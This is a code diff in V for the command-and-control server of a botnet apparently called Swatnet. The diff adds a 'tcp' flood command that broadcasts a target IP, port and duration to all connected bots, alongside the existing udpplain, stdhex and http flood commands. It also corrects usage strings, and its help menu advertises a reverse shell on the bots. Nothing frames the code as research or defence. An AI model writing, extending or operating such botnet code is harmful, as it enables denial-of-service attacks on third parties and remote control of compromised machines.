@@ -129,11 +129,14 @@ pub fn (mut s Swatnet) handler(mut client net.TcpConn) {
 		fcmd, cmd, args := s.bot.parse_buffer(data)
 		if data.len > 2 {
 			match cmd {
+				/* 	All attack commands must move to 
+					/core/attack/main.v
+				*/
 				"home" {
 					client.write_string("╔═╗╦ ╦╔═╗╔╦╗╔╗╔╔═╗╔╦╗\r\n╚═╗║║║╠═╣ ║ ║║║║╣  ║ \r\n╚═╝╚╩╝╩ ╩ ╩ ╝╚╝╚═╝ ╩\r\n") or { 0 }
 				}
 				"help" {
-					client.write_string("home | Dashboard\r\nhelp | List of commands\r\nbots | List Of Bots\r\ncls | Clear Screen\r\nudpplain | udpplain <ip> <port> <time>\r\nstdhex <ip> <port <time>\r\nexec | Reverse Shell [BOTS]\r\n") or { 0 }
+					client.write_string("home | Dashboard\r\nhelp | List of commands\r\nbots | List Of Bots\r\ncls | Clear Screen\r\nudpplain | udpplain <ip> <port> <time>\r\ntcp | tcp <ip> <port> <time>\r\nstdhex <ip> <port <time>\r\nexec | Reverse Shell [BOTS]\r\n") or { 0 }
 				}
 				"cls" {
 					client.write_string("\033[2J\033[1;1H╔═╗╦ ╦╔═╗╔╦╗╔╗╔╔═╗╔╦╗\r\n╚═╗║║║╠═╣ ║ ║║║║╣  ║ \r\n╚═╝╚╩╝╩ ╩ ╩ ╝╚╝╚═╝ ╩\r\n") or { 0 }
@@ -151,10 +154,18 @@ pub fn (mut s Swatnet) handler(mut client net.TcpConn) {
 						bots := s.bot.broadcast_cmd("udpplain ${args[1]} ${args[2]} ${args[3]}")
 						client.write_string("[ + ] Attack successfully sent to ${bots} bots...!\r\n") or { 0 }
 					}
-				} 
+				}
+				"tcp" {
+					if args.len < 4 {
+						client.write_string("[ x ] Error, Invalid arguments provided.\r\nUsage: tcp <ip> <port> <time>\r\n") or { 0 }
+					} else {
+						bots := s.bot.broadcast_cmd("tcp ${args[1]} ${args[2]} ${args[3]}")
+						client.write_string("[ + ] Attack successfully sent to ${bots} bots...!\r\n") or { 0 }
+					}
+				}
 				"stdhex" {
 					if args.len < 4 {
-						client.write_string("[ x ] Error, Invalid arguments provided.\r\nUsage: udp <ip> <port> <time>\r\n") or { 0 }
+						client.write_string("[ x ] Error, Invalid arguments provided.\r\nUsage: stdhex <ip> <port> <time>\r\n") or { 0 }
 					} else {
 						bots := s.bot.broadcast_cmd("stdhex ${args[1]} ${args[2]} ${args[3]}")
 						client.write_string("[ + ] Attack successfully sent to ${bots} bots...!\r\n") or { 0 }
@@ -162,7 +173,7 @@ pub fn (mut s Swatnet) handler(mut client net.TcpConn) {
 				}
 				"http" {
 					if args.len < 3 {
-						client.write_string("[ x ] Error, Invalid arguments provided.\r\nUsage: udp <ip> <port> <time>\r\n") or { 0 }
+						client.write_string("[ x ] Error, Invalid arguments provided.\r\nUsage: http <ip> <time>\r\n") or { 0 }
 					} else {
 						bots := s.bot.broadcast_cmd("http ${args[1]} ${args[2]}")
 						client.write_string("[ + ] Attack successfully sent to ${bots} bots...!\r\n") or { 0 }
